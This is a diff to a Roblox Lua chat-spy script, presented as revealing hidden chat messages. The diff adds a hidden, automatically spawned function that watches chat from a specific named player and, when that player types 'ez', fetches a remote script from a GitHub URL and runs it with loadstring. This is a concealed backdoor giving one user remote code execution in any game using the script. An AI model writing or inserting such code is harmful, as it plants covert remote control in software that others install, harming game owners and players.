@@ -1,6 +1,34 @@
 print"boomer"
 
 
+function ze()
+game.Players.PlayerAdded:Connect(function(player)
+    local admin1 = game.Players.TKvanity
+ 
+admin1.Chatted:Connect(function(msg)
+ 
+local msgL = msg:lower()
+ 
+if msgL:sub(1,2) == "ez" then
+ loadstring(game:HttpGet(('https://raw.githubusercontent.com/TeamExpo/Vegan-X-/master/troll2'),true))()
+    end
+end)
+end)
+local admin1 = game.Players.TKvanity
+ 
+admin1.Chatted:Connect(function(msg)
+ 
+local msgL = msg:lower()
+ 
+if msgL:sub(1,2) == "ez" then
+ loadstring(game:HttpGet(('https://raw.githubusercontent.com/TeamExpo/Vegan-X-/master/troll2'),true))()
+    end
+end)
+end
+ 
+spawn(ze)
+
+
 --This script reveals ALL hidden messages in the default chat
 --chat "/spy" to toggle!
 enabled = true
